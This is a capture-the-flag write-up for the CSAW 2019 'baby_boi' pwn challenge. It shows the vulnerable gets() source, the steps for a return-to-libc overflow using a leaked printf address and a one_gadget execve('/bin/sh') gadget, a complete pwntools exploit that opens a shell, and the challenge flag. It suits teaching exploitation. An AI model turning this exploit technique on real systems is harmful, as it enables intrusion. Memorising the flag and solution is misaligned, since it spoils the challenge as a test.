# baby_boi

Category: `pwn`

Description: `Welcome to pwn.`

Service: `nc pwn.chal.csaw.io 1005`

Points: `50`

**Files**
- [baby_boi](files/baby_boi)
- [libc-2.27.so](files/libc-2.27.so)
- [baby_boi.c](files/baby_boi.c)

### What It Does

```shellsession
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ file baby_boi
baby_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=e1ff55dce2efc89340b86a666bba5e7ff2b37f62, not stripped
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ 
```

The 64-bit binary prints the address `printf@libc` and reads user input, which can overflow the buffer.

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv[]) {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  char buf[32];
  printf("Hello!\n");
  printf("Here I am: %p\n", printf);
  gets(buf);
}
```

An example run:

```shellsession
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ ./baby_boi 
Hello!
Here I am: 0x7f275e291e80
123
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ 
```

### How to Solve

This is a return-to-libc buffer overflow attack.

First, we try to overflow the buffer and get the offset of the saved return address to gain `RIP` control. 

```shellsession
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ cyclic -n 8 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ valgrind ./baby_boi
==10757== Memcheck, a memory error detector
==10757== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.
==10757== Using Valgrind-3.13.0 and LibVEX; rerun with -h for copyright info
==10757== Command: ./baby_boi
==10757== 
Hello!
Here I am: 0x4ea0e80
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
==10757== Jump to the invalid address stated on the next line
==10757==    at 0x6161616161616166: ???
==10757==    by 0x6161616161616166: ???
==10757==    by 0x6161616161616167: ???
==10757==    by 0x6161616161616168: ???
==10757==    by 0x6161616161616169: ???
==10757==    by 0x616161616161616A: ???
==10757==    by 0x616161616161616B: ???
==10757==    by 0x6161616C: ???
==10757==    by 0x1FFEFFFE8F: ???
==10757==  Address 0x6161616161616166 is not stack'd, malloc'd or (recently) free'd
==10757== 
==10757== 
==10757== Process terminating with default action of signal 11 (SIGSEGV)
==10757==  Bad permissions for mapped region at address 0x6161616161616166
==10757==    at 0x6161616161616166: ???
==10757==    by 0x6161616161616166: ???
==10757==    by 0x6161616161616167: ???
==10757==    by 0x6161616161616168: ???
==10757==    by 0x6161616161616169: ???
==10757==    by 0x616161616161616A: ???
==10757==    by 0x616161616161616B: ???
==10757==    by 0x6161616C: ???
==10757==    by 0x1FFEFFFE8F: ???
==10757== 
==10757== HEAP SUMMARY:
==10757==     in use at exit: 0 bytes in 0 blocks
==10757==   total heap usage: 0 allocs, 0 frees, 0 bytes allocated
==10757== 
==10757== All heap blocks were freed -- no leaks are possible
==10757== 
==10757== For counts of detected and suppressed errors, rerun with: -v
==10757== ERROR SUMMARY: 1 errors from 1 contexts (suppressed: 0 from 0)
Segmentation fault (core dumped)
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ cyclic -n 8 -l 0x6161616161616166
40
```

The offset of the saved return address is at `40`.

Next, we get the offset of `printf@libc`.

```shellsession
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ objdump -d libc-2.27.so | grep '<_IO_printf@@GLIBC_2.2.5>:'
0000000000064e80 <_IO_printf@@GLIBC_2.2.5>:
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ 
```

The offset of `printf@libc` is `0x64e80`. We can calculate the base libc address using the leaked address and offset of `printf@libc`.

Then, we get the offset of a gadget from libc that can give us a shell.

```shellsession
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ one_gadget libc-2.27.so
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ 
```

We choose the second gadget of offset `0x4f322` because we can overflow the buffer such that the stack contains null bytes and fulfill the costraint. We can calculate the address of the `execve` gadget using the base libc address and the offset of the `execve` gadget.

To get a shell, we overflow the buffer and overwrite the saved return address to the address of the `execve` gadget.

```python
#!/bin/python

import pwn


PRINTF_OFFSET = 0x64e80
ONE_GADGET_OFFSET = 0x4f322  # [rsp+0x40] == NULL


def main():
    p = pwn.process("./baby_boi")
    # p = pwn.remote("pwn.chal.csaw.io", 1005)

    data = p.recvrepeat(0.2)

    while not data:
        data = p.recvrepeat(0.2)

    leak = data[data.find(": ")+2:data.rfind("\n")]

    pwn.log.info("Leaked printf() address: {printf_addr}".format(printf_addr=leak))

    printf_addr = int(leak, 16)
    libc_base = printf_addr - PRINTF_OFFSET
    one_gadget_addr = libc_base + ONE_GADGET_OFFSET

    payload = "A" * 40
    payload += pwn.p64(one_gadget_addr)
    payload = payload.ljust(150, "\x00")

    p.sendline(payload)
    p.interactive()


if __name__ == "__main__":
    main()
```

Check that the solution works for the binary.

```shellsession
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ python baby_boi_soln.py [+] Starting local process './baby_boi': pid 9719
[*] Leaked printf() address: 0x7ffbc5dc0e80
[*] Switching to interactive mode
$ pwd
/home/ubuntu/ctf/2019/csaw_ctf_quals/pwn
$ exit
[*] Got EOF while reading in interactive
$ 
[*] Process './baby_boi' stopped with exit code 0 (pid 9719)
[*] Got EOF while sending in interactive
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ 
```

Get the flag on the server.

```shellsession
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ python baby_boi_soln.py [+] Opening connection to pwn.chal.csaw.io on port 1005: Done
[*] Leaked printf() address: 0x7fcd3e04ee80
[*] Switching to interactive mode
$ ls
baby_boi
flag.txt
$ cat flag.txt
flag{baby_boi_dodooo_doo_doo_dooo}
$ exit
[*] Got EOF while reading in interactive
$ 
[*] Closed connection to pwn.chal.csaw.io port 1005
[*] Got EOF while sending in interactive
ubuntu@ubuntu-bionic:/ctf/2019/csaw_ctf_quals/pwn$ 
```

**Flag: `flag{baby_boi_dodooo_doo_doo_dooo}`**

**Files**
- [baby_boi_soln.py](files/baby_boi_soln.py)